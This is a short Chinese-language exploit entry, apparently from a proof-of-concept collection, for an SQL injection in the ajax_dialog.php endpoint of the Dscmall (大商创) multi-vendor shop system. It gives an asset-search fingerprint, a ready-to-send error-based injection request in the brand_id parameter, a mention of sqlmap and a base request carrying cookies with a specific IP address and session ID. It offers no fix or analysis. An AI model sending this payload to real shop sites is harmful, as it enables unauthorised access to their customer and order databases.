# 大商创多用户商城系统ajax_dialog存在SQL注入漏洞

- **系统**：大商创多用户商城系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="Dscmall"`
- **请求**：`GET /ajax_dialog.php?_=1600309513833&act=getUserInfo&brand_id=1 AND GTID_SUBSET(CONCAT(0x71716a6271,(SELECT (ELT(4764=4764,1))),0x7170716a71),4764)&is_jsonp=1&jsoncallback=jQuery19106489774159975068_1600309513832&seckillid=null&temp=backup_tpl_1 HTTP/1.1`
- **关键头**：`Cookie: real_ipd=43.198.104.154; dsc_real_ip=43.198.104.154; ECS_ID=caa864f5a2579377c4e3…`

**请求体 / payload**
```
qqjbq1qpqjq
sqlmap
GET /ajax_dialog.php?_=1600309513833&act=getUserInfo&brand_id=1&is_jsonp=1&jsoncallback=jQuery19106489774159975068_1600309513832&seckillid=null&temp=backup_tpl_1 HTTP/1.1
Host:
Cookie: real_ipd=43.198.104.154; dsc_real_ip=43.198.104.154; ECS_ID=caa864f5a2579377c4e39d5518a8e0a807d91019; ECS[visit_times]=1; province=22; city=286; district=0; street=1; street_area=1; session_id_ip=43.198.104.154_caa864f5a2579377c4e39d5518a8e0a8; Hm_lvt_1abd18f2b2abf273be5b81fd42f63a90=1711603825; Hm_lpvt_1abd18f2b2abf273be5b81fd42f63a90=1711603825
```

**其他**
- 大商创多用户商城系统ajax\_dialog存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 大商创多用户商城系统